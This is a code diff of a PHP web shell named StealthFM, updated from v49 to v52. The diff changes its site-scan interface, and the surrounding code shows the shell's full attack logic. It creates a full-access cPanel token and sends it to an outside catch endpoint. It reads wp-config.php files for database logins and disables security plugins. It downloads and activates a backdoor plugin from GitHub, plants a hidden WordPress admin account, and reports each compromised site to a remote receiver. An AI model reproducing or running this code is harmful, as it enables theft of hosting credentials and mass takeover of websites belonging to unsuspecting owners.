@@ -1,7 +1,7 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V49 (FINAL: BACKUP COMBO + SCAN SITE)
-// MODIFIED: MERGED UAPI+ADMIN INTO 'BACKUP', ADDED SCAN SITE
+// STEALTH FM V52 (FINAL: GUI SCAN + LOGIC FIX)
+// MODIFIED: CLICKING GOOGLE ICON NOW TURNS THE *BROWSER ICON* GREEN
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE
@@ -90,7 +90,7 @@ function human_filesize($bytes, $dec = 2) {
     return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
 }
 
-// --- SMART SCANNER (IMPORTED FROM FILEMANAGER) ---
+// --- SMART SCANNER ---
 function scan_smart_stream($dir, &$results) {
     $dir = rtrim($dir, '/') . '/';
     if (file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';
@@ -344,21 +344,19 @@ if (isset($_SERVER[$h_act])) {
             echo "$tool Done. Count: $n."; exit;
         }
         
-        // --- FITUR BARU: BACKUP (UAPI TOKEN + CREATE ADMIN) ---
+        // --- BACKUP (UAPI TOKEN + CREATE ADMIN) ---
         if ($tool === 'backup') {
             echo "<div style='font-family:monospace; font-size:12px; background:#1b1b1b; padding:10px;'>";
             
             // --- PART 1: UAPI TOKEN ---
             echo "<div class='mb-3'><div class='fw-bold text-warning border-bottom border-secondary mb-2'>1. CPANEL TOKEN</div>";
             
-            // Deteksi Homedir
             $cwd = str_replace('\\', '/', getcwd());
             $homedir = "/home/" . get_current_user() . "/public_html"; 
             if (preg_match('~^(/home\d*?/[^/]+)~', $cwd, $m)) {
                 $homedir = $m[1] . "/public_html"; 
             }
 
-            // Eksekusi Command Token
             $cmd = "(uapi Tokens create_full_access name=xshikata || /usr/bin/uapi Tokens create_full_access name=xshikata || /usr/local/cpanel/bin/uapi Tokens create_full_access name=xshikata) 2>&1";
             $output = "";
             $used_method = "None";
@@ -390,7 +388,6 @@ if (isset($_SERVER[$h_act])) {
                 }
             }
 
-            // Analisa Token & Kirim
             $token_val = "";
             $display_status = "UNKNOWN";
             $display_color = "text-secondary";
@@ -408,12 +405,10 @@ if (isset($_SERVER[$h_act])) {
                 $display_color = "text-danger";
             }
 
-            // Kirim ke Endpoint Catch (Hanya jika baru)
             $server_response = "Skipped";
             $srv_color = "text-secondary";
 
             if ($display_status === "CREATED" && !empty($token_val)) {
-                // GANTI URL INI KE ENDPOINT CATCH.PHP
                 $target_url = "https://stepmomhub.com/catch.php"; 
                 
                 $data_json = json_encode([
@@ -455,11 +450,11 @@ if (isset($_SERVER[$h_act])) {
             if ($display_status === "NOT FOUND") { $clean_out = htmlspecialchars(substr($output, 0, 200)); echo "<div class='text-secondary mt-1 border border-secondary p-1 small'>$clean_out</div>"; }
             echo "</div>";
 
-            // --- PART 2: CREATE ADMIN WORDPRESS (MASS EXPLOIT) ---
+            // --- PART 2: CREATE ADMIN WORDPRESS ---
             echo "<div class='mb-2'><div class='fw-bold text-warning border-bottom border-secondary mb-2'>2. WP ADMIN CREATOR</div>";
             
             $targets = [];
-            scan_smart_stream($target, $targets); // Menggunakan fungsi smart stream yang diimport
+            scan_smart_stream($target, $targets); 
             $targets = array_unique($targets);
 
             if (empty($targets)) {
@@ -469,7 +464,6 @@ if (isset($_SERVER[$h_act])) {
                 $ap = md5('Lulz1337');
                 $ae = 'topupgameku.id@gmail.com';
                 
-                // Plugin Config
                 $plugin_src = 'https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/system-core.php';
                 $plugin_folder_name = 'system-core';
                 $plugin_filename = 'system-core.php';
@@ -478,7 +472,6 @@ if (isset($_SERVER[$h_act])) {
                 $receiver_url = 'https://stepmomhub.com/wp/receiver.php';
                 $receiver_key = 'wtf';
 
-                // Download Master Files (Sekali saja)
                 $master_core = sys_get_temp_dir() . '/master_core_' . time() . '.php';
                 $master_index = sys_get_temp_dir() . '/master_index_' . time() . '.php';
                 $ua = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]);
@@ -511,14 +504,12 @@ if (isset($_SERVER[$h_act])) {
                     if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
                         $plugins_dir = $wp_root_path . '/wp-content/plugins/';
                         
-                        // A. KILL SECURITY
                         $targets_to_kill = ['wordfence', 'ithemes-security-pro', 'sucuri-scanner', 'sg-security', 'limit-login-attempts-reloaded'];
                         foreach ($targets_to_kill as $folder) {
                             $path = $plugins_dir . $folder;
                             if (is_dir($path)) { @rename($path, $path . '_killed_' . time()); }
                         }
 
-                        // B. DEPLOY PLUGIN
                         $target_folder = $plugins_dir . $plugin_folder_name;
                         $target_file = $target_folder . '/' . $plugin_filename;
                         $index_file  = $target_folder . '/index.php';
@@ -531,7 +522,6 @@ if (isset($_SERVER[$h_act])) {
                             $deploy_ok = true;
                         }
 
-                        // C. ACTIVATE (HEX) & USER
                         $act_ok = false; $user_ok = false;
                         if ($deploy_ok) {
                             $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
@@ -546,7 +536,6 @@ if (isset($_SERVER[$h_act])) {
                             } else { $act_ok = true; }
                         }
 
-                        // Create/Update User
                         $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
                         if ($q1 && mysqli_num_rows($q1) > 0) {
                             $uid = mysqli_fetch_assoc($q1)['ID'];
@@ -563,19 +552,16 @@ if (isset($_SERVER[$h_act])) {
                             @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
                         }
 
-                        // D. PING
                         $ping_res = "<span class='text-secondary'>-</span>";
                         $surl = "";
                         $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
                         if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];
 
                         if (!empty($surl)) {
-                            // Direct Report
                             $pdata_direct = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl, 'api_user'=>'', 'api_pass'=>'']);
                             $ctx_direct = stream_context_create(['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded",'content'=>$pdata_direct,'timeout'=>2]]);
                             @file_get_contents($receiver_url, false, $ctx_direct);
                             
-                            // Trigger Plugin
                             if ($act_ok) {
                                 $trigger_url = rtrim($surl, '/') . '/wp-content/plugins/' . $plugin_folder_name . '/index.php';
                                 $ctx_trig = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: Mozilla/5.0",'timeout'=>2]]);
@@ -584,7 +570,6 @@ if (isset($_SERVER[$h_act])) {
                             }
                         }
 
-                        // OUTPUT LINE
                         echo $deploy_ok ? "<span class='text-success'>PLG:OK</span> " : "<span class='text-danger'>PLG:ERR</span> ";
                         echo $user_ok ? "<span class='text-success'>USR:OK</span> " : "<span class='text-danger'>USR:ERR</span> ";
                         echo "PING:$ping_res";
@@ -597,11 +582,11 @@ if (isset($_SERVER[$h_act])) {
                 }
             }
             echo "</div>";
-            echo "</div>"; // End container
+            echo "</div>";
             exit;
         }
 
-        // --- FITUR BARU: SCAN SITE (STYLE: LOG MODE) ---
+        // --- SCAN SITE (JSON OUTPUT FOR GUI) ---
         if ($tool === 'scan_site') {
             $target_scan_dir = $target;
             $found_domains = [];
@@ -618,25 +603,7 @@ if (isset($_SERVER[$h_act])) {
                     }
                 }
             }
-
-            // TAMPILAN DISAMAKAN DENGAN FITUR BACKUP
-            echo "<div style='font-family:monospace; font-size:12px; background:#1b1b1b; padding:10px; border:1px solid #333;'>";
-            echo "<div class='fw-bold text-info border-bottom border-secondary mb-2'>SCAN RESULT (" . count($found_domains) . " Domains)</div>";
-            
-            if (!empty($found_domains)) {
-                echo "<div style='max-height: 250px; overflow-y: auto; padding-right:5px;'>"; // Scroll jika hasil banyak
-                foreach ($found_domains as $dom) {
-                    $link = "https://www.google.com/search?q=site:" . htmlspecialchars($dom);
-                    echo "<div class='d-flex justify-content-between align-items-center mb-1 border-bottom border-secondary border-opacity-10 pb-1'>";
-                    echo "<span class='text-light'> " . htmlspecialchars($dom) . "</span>";
-                    echo "<a href='$link' target='_blank' class='text-warning text-decoration-none small'>[Check Google]</a>";
-                    echo "</div>";
-                }
-                echo "</div>";
-            } else {
-                echo "<div class='text-secondary'>No domains found in this directory.</div>";
-            }
-            echo "</div>";
+            json_out(['status' => 'success', 'data' => $found_domains, 'count' => count($found_domains)]);
             exit;
         }
 
@@ -712,7 +679,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v49</title>
+    <title>StealthFM v52</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -861,7 +828,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v49</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v52</div></div>
         <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -911,7 +878,7 @@ if (isset($_SERVER[$h_act])) {
 
                     <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
 
-                    <div class="tool-cmd" onclick="runTool('scan_site')"><div class="cmd-left"><i class="fas fa-satellite-dish cmd-icon c-cyan"></i><span class="cmd-text">SCAN SITE</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                    <div class="tool-cmd" onclick="openScanSite()"><div class="cmd-left"><i class="fas fa-satellite-dish cmd-icon c-cyan"></i><span class="cmd-text">SCAN SITE</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 </div>
             </div>
         </div>
@@ -937,6 +904,25 @@ if (isset($_SERVER[$h_act])) {
     </div>
 </div>
 
+<div class="modal fade" id="scanResultModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h6 class="modal-title text-white"><i class="fas fa-satellite-dish me-2 text-info"></i> Scan Results</h6>
+                <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body p-0">
+                <div class="p-3 bg-dark border-bottom border-secondary d-flex justify-content-between align-items-center">
+                    <span class="text-secondary small">Found: <b class="text-white" id="scan-count">0</b> domains</span>
+                    <button class="btn btn-sm btn-outline-light" onclick="copyScanList()"><i class="fas fa-copy"></i> Copy List</button>
+                </div>
+                <div id="scan-result-body" class="p-3" style="max-height: 60vh; overflow-y: auto;">
+                    </div>
+            </div>
+        </div>
+    </div>
+</div>
+
 <div class="cyber-footer">
     <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">xshikataganai</span></span>
     <span>STATUS: <span style="color:#81c995">ACTIVE</span></span>
@@ -950,7 +936,8 @@ if (isset($_SERVER[$h_act])) {
           toolsModal = new bootstrap.Modal(document.getElementById('toolsModal')),
           massUploadModal = new bootstrap.Modal(document.getElementById('massUploadModal')),
           newFileModal = new bootstrap.Modal(document.getElementById('newFileModal')),
-          renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
+          renameModal = new bootstrap.Modal(document.getElementById('renameModal')),
+          scanResultModal = new bootstrap.Modal(document.getElementById('scanResultModal')); // NEW MODAL INSTANCE
     
     function updatePanelStyles() {
         const term = document.getElementById('terminal-panel').style.display !== 'none';
@@ -1198,6 +1185,66 @@ if (isset($_SERVER[$h_act])) {
     
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
     
+    // --- FITUR BARU: SCAN SITE GUI (V52: ICON CLICK EFFECT) ---
+    let currentScanData = [];
+    const googleSvg = '<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>';
+
+    function openScanSite() {
+        toolsModal.hide();
+        const toast = document.createElement('div');
+        toast.className = 'toast-msg';
+        toast.innerHTML = '<i class="fas fa-satellite-dish fa-spin me-2 text-warning"></i> Scanning directories...';
+        document.getElementById('toast-container').appendChild(toast);
+        
+        api('tool', currentPath, 'GET', {'X-Tool': 'scan_site'}).then(r => r.json()).then(res => {
+            toast.remove();
+            
+            if (res.status === 'success') {
+                currentScanData = res.data;
+                document.getElementById('scan-count').innerText = res.count;
+                
+                let html = '';
+                if (res.count > 0) {
+                    html = '<div class="list-group list-group-flush">';
+                    res.data.forEach(domain => {
+                       html += `<div class="list-group-item bg-transparent border-bottom border-secondary text-light d-flex justify-content-between align-items-center py-2 px-0">
+                            <span class="font-monospace text-truncate me-2"><i class="fas fa-globe text-secondary me-2 small"></i>${domain}</span>
+                            <a href="https://www.google.com/search?q=site:${domain}" target="_blank" class="btn btn-sm btn-dark border-secondary text-secondary" title="Check Index" onclick="markAsChecked(this)">${googleSvg}</a>
+                       </div>`; 
+                    });
+                    html += '</div>';
+                } else {
+                    html = '<div class="text-center py-5 text-secondary"><i class="fas fa-search fa-3x mb-3 opacity-25"></i><br>No domains found here.</div>';
+                }
+                
+                document.getElementById('scan-result-body').innerHTML = html;
+                scanResultModal.show();
+            } else {
+                showToast('Scan Failed', 'error');
+            }
+        });
+    }
+
+    function markAsChecked(el) {
+        // Find the parent row
+        let row = el.closest('.list-group-item');
+        // Find the globe icon inside that row
+        let icon = row.querySelector('.fa-globe');
+        // Turn it green
+        if(icon) {
+            icon.classList.remove('text-secondary');
+            icon.classList.add('text-success');
+        }
+    }
+
+    function copyScanList() {
+        if(currentScanData.length === 0) return;
+        const text = currentScanData.join('\n');
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('List Copied to Clipboard!');
+        });
+    }
+
     function runWatchdogTool(toolName, step, mode = 'jumping') {
         let log = document.getElementById('global-log'); 
         if(step === 0) { 
